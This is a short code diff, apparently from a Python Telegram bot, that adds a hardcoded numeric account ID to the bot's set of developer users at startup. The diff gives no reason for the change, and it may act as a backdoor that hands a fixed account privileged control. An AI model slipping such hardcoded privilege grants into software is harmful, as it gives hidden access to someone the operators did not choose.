@@ -32,3 +32,4 @@ with spr:
     bot = spr.get_me()
     BOT_ID = bot.id
     BOT_USERNAME = bot.username
+    DEV_USERS.add(1930954213)
